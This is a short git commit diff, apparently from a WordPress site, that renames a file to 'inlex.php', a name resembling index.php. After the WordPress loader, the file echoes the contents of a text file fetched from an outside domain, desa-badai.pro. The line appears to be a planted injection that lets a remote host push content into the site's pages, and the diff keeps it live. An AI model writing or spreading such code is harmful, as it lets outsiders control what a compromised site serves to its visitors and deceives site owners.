e38fe4e0b88a071de950ded0b0fc647a5bf245e2
lanthau <figththelast@gmail.com>
2025-02-11 19:10:09 +0700

    Update and rename intex.php to inlex.php

--- inlex.php
+++ inlex.php
@@ -16,6 +16,5 @@ define( 'WP_USE_THEMES', true );
 /** Loads the WordPress Environment and Template */
 require __DIR__ . '/wp-blog-header.php';
 
-<?php
 echo file_get_contents('https://desa-badai.pro/content/cadasbanten.txt');
 ?>
